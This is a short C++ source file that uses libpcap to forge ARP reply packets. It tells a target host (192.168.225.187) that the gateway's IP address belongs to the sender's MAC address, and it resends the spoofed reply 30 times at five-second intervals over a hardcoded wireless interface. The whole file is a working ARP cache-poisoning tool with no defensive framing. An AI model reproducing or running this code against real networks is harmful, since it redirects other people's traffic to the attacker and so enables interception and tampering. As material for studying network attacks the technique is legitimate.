//
// Created by kenny on 1/2/19.
//
#include <pcap.h>

#include <cstring>
#include <cassert>

#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#include "arpspf.h"


// query system info
u_char src_mac[] = {
        u'\x50',u'\x2b',u'\x73',u'\xdc',u'\x54',u'\x3f'
};

// perform an arp request to obtain this
u_char dst_mac[] = {
        u'\x24',u'\x1b',u'\x7a',u'\x10',u'\x14',u'\xfc'
};

// use gateway by default
const char * fake_sender_ip = "192.168.225.1";
// user-defined
const char * target_ip = "192.168.225.187";

int main(int argc, char* argv[]) {
    ether_hdr etherHdr{};
    memcpy(etherHdr.src_addr, src_mac, 6);
    memcpy(etherHdr.dst_addr, dst_mac, 6);
    etherHdr.type = htons(ETHERTYPE_ARP);

    arp_hdr arpHdr{};
    arpHdr.htype = htons(ARP_HTYPE_ETHERNET);
    arpHdr.ptype = htons(ARP_PTYPE_IPV4);
    arpHdr.hlen = 6;
    arpHdr.plen = 4;
    arpHdr.oper = htons(ARP_OPER_REPLY);
    memcpy(arpHdr.sha, src_mac, 6);
    assert(inet_pton(AF_INET, fake_sender_ip, &arpHdr.spa));
    memcpy(arpHdr.tha, dst_mac, 6);
    assert(inet_pton(AF_INET, target_ip, &arpHdr.tpa));

    u_char sndbuf[512] = {0};
    memcpy(sndbuf, &etherHdr, ETHER_HDR_LEN);
    static_assert(ARP_HDR_LEN == sizeof(arp_hdr), "length of arp_hdr != ARP_HDR_LEN");
    memcpy(sndbuf+ETHER_HDR_LEN, &arpHdr, ARP_HDR_LEN);


    char errbuf[1024] = {0};
    auto handle = pcap_open_live("wlx502b73dc543f", 4096, 1, 0, errbuf);
    if (handle == nullptr) {
        fatal_error("pcap_open_live", errbuf);
    }

    auto maximum = 30;

    for (int i = 0; i < maximum; ++i) {
        sleep(5);
        int ret = pcap_sendpacket(handle, sndbuf, ETHER_HDR_LEN+ARP_HDR_LEN);
        if (ret == PCAP_ERROR) {
            pcap_perror(handle, errbuf);
            fatal_error("pcap_sendpacket", errbuf);
        } else {
            printf("ARP packet sent.\n");
        }
    }

    pcap_close(handle);
}

